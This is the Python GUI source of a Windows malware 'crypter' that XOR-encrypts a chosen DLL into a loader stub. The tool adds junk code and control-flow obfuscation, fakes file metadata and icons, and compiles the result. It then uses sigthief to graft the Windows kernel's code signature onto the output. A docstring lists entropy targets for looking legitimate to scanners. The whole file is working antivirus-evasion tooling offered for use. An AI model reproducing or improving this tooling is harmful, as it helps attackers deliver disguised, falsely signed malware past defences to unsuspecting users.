# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'gui.ui'
#
# Created by: PyQt5 UI code generator 5.15.6
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.

"""
TODO :
    - Good Section sizes
    - Random Windows API calls (help)
    
Done :
    - LoadPE
    - Junk code
    - Control flow
    - IAT obfuscation (adding "normal" imports in addition to the others)
    - Change PE metadata (company, description, etc...)
    - File icon
    - Code signing
    - Good entropy
    - Add resources (random number of random generated bitmaps) --> Not used because it increases the entropy too much
    
Note about entropy :
    Entropy: between 0 and 8
    "Most legit" range     : [4.8; 6.8]
    "Most malicious" range : [7.2; 8.0]
    Best entropy : 6.4
"""

from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QApplication
from PyQt5.QtCore import QCoreApplication
from PyQt5.QtGui import QPixmap
from obfuscation import obfuscate
from metadata import change_metadata
import os, shutil, glob

class Ui_mainWindow(object):
    def __init__(self) :
        self.xor = False
        self.cflow = False
        self.junk = False
        self.filepath = ""
        self.icon_path = ""
        
    def setupUi(self, mainWindow):
        mainWindow.setObjectName("mainWindow")
        mainWindow.setEnabled(True)
        mainWindow.resize(262, 289)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Fixed, QtWidgets.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(mainWindow.sizePolicy().hasHeightForWidth())
        mainWindow.setSizePolicy(sizePolicy)
        mainWindow.setMinimumSize(QtCore.QSize(262, 289))
        mainWindow.setMaximumSize(QtCore.QSize(262, 289))
        self.centralwidget = QtWidgets.QWidget(mainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(30, 30, 75, 23))
        self.pushButton.setObjectName("pushButton")
        self.checkBox = QtWidgets.QCheckBox(self.centralwidget)
        self.checkBox.setEnabled(True)
        self.checkBox.setGeometry(QtCore.QRect(20, 80, 81, 17))
        self.checkBox.setObjectName("checkBox")
        self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(120, 90, 113, 20))
        self.lineEdit.setObjectName("lineEdit")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setEnabled(True)
        self.label.setGeometry(QtCore.QRect(160, 70, 47, 13))
        self.label.setObjectName("label")
        self.pushButton_2 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_2.setGeometry(QtCore.QRect(10, 220, 241, 41))
        self.pushButton_2.setObjectName("pushButton_2")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(20, 200, 201, 21))
        self.label_2.setObjectName("label_2")
        self.checkBox_2 = QtWidgets.QCheckBox(self.centralwidget)
        self.checkBox_2.setGeometry(QtCore.QRect(20, 120, 91, 16))
        self.checkBox_2.setObjectName("checkBox_2")
        self.spinBox = QtWidgets.QSpinBox(self.centralwidget)
        self.spinBox.setGeometry(QtCore.QRect(155, 118, 42, 22))
        self.spinBox.setObjectName("spinBox")
        self.spinBox.setValue(8)
        self.spinBox.setMinimum(1)
        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(120, 122, 47, 13))
        self.label_3.setObjectName("label_3")
        self.label_4 = QtWidgets.QLabel(self.centralwidget)
        self.label_4.setGeometry(QtCore.QRect(120, 142, 47, 13))
        self.label_4.setObjectName("label_4")
        self.spinBox_2 = QtWidgets.QSpinBox(self.centralwidget)
        self.spinBox_2.setGeometry(QtCore.QRect(155, 138, 42, 22))
        self.spinBox_2.setObjectName("spinBox_2")
        self.spinBox_2.setValue(3)
        self.spinBox_2.setMinimum(1)
        self.checkBox_3 = QtWidgets.QCheckBox(self.centralwidget)
        self.checkBox_3.setGeometry(QtCore.QRect(20, 140, 91, 16))
        self.checkBox_3.setObjectName("checkBox_3")
        self.pushButton_3 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_3.setGeometry(QtCore.QRect(20, 170, 75, 23))
        self.pushButton_3.setObjectName("pushButton_3")
        self.label_img = QtWidgets.QLabel(self.centralwidget)
        self.label_img.setGeometry(QtCore.QRect(120, 160, 51, 41))
        self.label_img.setObjectName("label_img")
        mainWindow.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(mainWindow)
        self.statusbar.setEnabled(True)
        self.statusbar.setSizeGripEnabled(False)
        self.statusbar.setObjectName("statusbar")
        mainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(mainWindow)
        QtCore.QMetaObject.connectSlotsByName(mainWindow)
        
        # Create a QTimer to call the mainloop function every frame
        self.timer = QtCore.QTimer()
        self.timer.timeout.connect(self.mainloop)
        self.timer.start(16)  # Adjust the interval as needed (16 milliseconds for ~60 FPS)

    def retranslateUi(self, mainWindow):
        _translate = QtCore.QCoreApplication.translate
        mainWindow.setWindowTitle(_translate("mainWindow", "patate\'s crypter"))
        self.pushButton.setText(_translate("mainWindow", "Select file"))
        self.pushButton.clicked.connect(self.fileDialog)
        self.checkBox.setText(_translate("mainWindow", "XOR Encrypt"))
        self.label.setText(_translate("mainWindow", "Key :"))
        self.pushButton_2.setText(_translate("mainWindow", "Generate"))
        self.pushButton_2.clicked.connect(self.generate)
        self.pushButton_3.setText(_translate("mainWindow", "Icon"))
        self.pushButton_3.clicked.connect(self.IconfileDialog)
        self.label_2.setText(_translate("mainWindow", ""))
        self.label_2.hide()
        self.label_3.setText(_translate("mainWindow", "Pass :"))
        self.label_4.setText(_translate("mainWindow", "Pass :"))
        self.checkBox_2.setText(_translate("mainWindow", "Add junk code"))
        self.checkBox_3.setText(_translate("mainWindow", "Control flow"))
    
    def generate(self) :
        in_filename = self.filepath
        out_filename = self.pushButton.text().split(".")[0] + "_out.exe"
        xor_key = ''

        if self.xor :
            xor_key = self.lineEdit.text()
        
        self.label_2.show()
        
        if not os.path.exists(in_filename):
            self.label_2.setText(f"\"{in_filename}\" does not exist!")
            QCoreApplication.processEvents()
            return
    
        self.label_2.setText("Creating sample header...")
        QCoreApplication.processEvents()
        
        print(f"Filename : {in_filename}")
        file = bytearray(open(in_filename, 'rb').read())
        with open("sample.h", 'w') as output:
            output.write("unsigned char sample[] = { ")
            for count, byte in enumerate(file, 1):
                if xor_key :
                    output.write(
                        f'{byte ^ ord(xor_key[(count - 1) % len(xor_key)]):#0{4}x},' + (
                            '\n' if not count % 16 else ' '))
                else :
                    output.write(f'{byte:#0{4}x},' + ('\n' if not count % 16 else ' '))
                    
            output.write("};")
        
        self.label_2.setText("done.")
        QCoreApplication.processEvents()
        
        # Working with a copy of main.cpp
        os.rename("main.cpp", "DO_NOT_TOUCH.cpp")
        shutil.copyfile('DO_NOT_TOUCH.cpp', 'main.cpp')
        
        with open("config.h", "w") as c :
            c.write(f'#pragma once\n#define KEY "{xor_key}"')
        
        self.label_2.setText("Adding junk code...")
        QCoreApplication.processEvents()
        obfuscate(self.spinBox.value(), self.spinBox_2.value(), self.cflow, self.junk)
        self.label_2.setText("done.")
        QCoreApplication.processEvents()
        
        self.label_2.setText("Changing metadata...")
        QCoreApplication.processEvents()
        change_metadata(self.icon_path)
        
        self.label_2.setText("done.")
        QCoreApplication.processEvents()
        
        self.label_2.setText("Compiling...")
        QCoreApplication.processEvents()
        
        vs_path = os.popen("\"%ProgramFiles(x86)%/Microsoft Visual Studio/Installer/vswhere.exe\" -nologo -latest -property installationPath").read().replace("\n","") #https://stackoverflow.com/questions/46223916/msbuild-exe-not-found-cmd-exe
        cmd_line = vs_path + "\\Msbuild\\Current\\Bin\\MSBuild.exe"
        
        return_code = os.system("\""+cmd_line+"\" . /p:Configuration=Release;Platform=x86;OutDir=.;DebugSymbols=false;DebugType=None;Zm=5000;TargetExt=.exe;TargetName="+out_filename.replace(".exe", "")+"  /t:Rebuild")
        
        if return_code :
            self.label_2.setText("build failed.")
            QCoreApplication.processEvents()

        # Cleaning up..
        os.remove("main.cpp")
        os.rename("DO_NOT_TOUCH.cpp", "main.cpp")
        
        # Find all BMP files in the directory with a wildcard pattern
        bmp_files = glob.glob(os.path.join(".", "*.bmp"))

        # Delete each BMP file
        for bmp_file in bmp_files:
            try:
                os.remove(bmp_file)
            except :
                pass
        
        if not return_code :
            self.label_2.setText(f"--> {out_filename}")
            QCoreApplication.processEvents()
        else :
            return
        
        self.label_2.setText("Signing the file...")
        QCoreApplication.processEvents()
        
        windir = os.getenv("WINDIR")
        cmd = f'python sigthief.py -i "{windir}\\System32\\ntoskrnl.exe" -t {out_filename} -o {out_filename.replace(".exe","")+"_signed"}.exe'
        os.system(cmd)
        
        os.remove(out_filename)
        os.rename(out_filename.replace(".exe","")+"_signed.exe", out_filename)
        
        self.label_2.setText("done.")
        QCoreApplication.processEvents()
        
    def fileDialog(self):
        options = QtWidgets.QFileDialog.Options()
        options |= QtWidgets.QFileDialog.ReadOnly
        filePath, _ = QtWidgets.QFileDialog.getOpenFileName(
            None, "Select a file", "", "Dll Files (*.dll);;All Files (*)", options=options)
        if filePath:
            # Display the selected file path in the QLineEdit
            self.pushButton.setText(filePath.split("/")[-1:][0])
            self.filepath = filePath
            
    
    def IconfileDialog(self):
        options = QtWidgets.QFileDialog.Options()
        options |= QtWidgets.QFileDialog.ReadOnly
        filePath, _ = QtWidgets.QFileDialog.getOpenFileName(
            None, "Select a file", "", "Icon files (*.ico)", options=options)
        if filePath:
            # Display the selected file path in the QLineEdit
            self.pushButton_3.setText(filePath.split("/")[-1:][0])
            self.icon_path = filePath
            self.pixmap = QPixmap(filePath)
            self.pixmap = self.pixmap.scaled(self.label_img.size(), QtCore.Qt.KeepAspectRatio, QtCore.Qt.SmoothTransformation)
            self.label_img.setPixmap(self.pixmap)
            
    def mainloop(self) :
        self.xor = self.checkBox.isChecked()
        self.cflow = self.checkBox_3.isChecked()
        self.junk = self.checkBox_2.isChecked()

if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    mainWindow = QtWidgets.QMainWindow()
    ui = Ui_mainWindow()
    ui.setupUi(mainWindow)
    mainWindow.show()
    sys.exit(app.exec_())
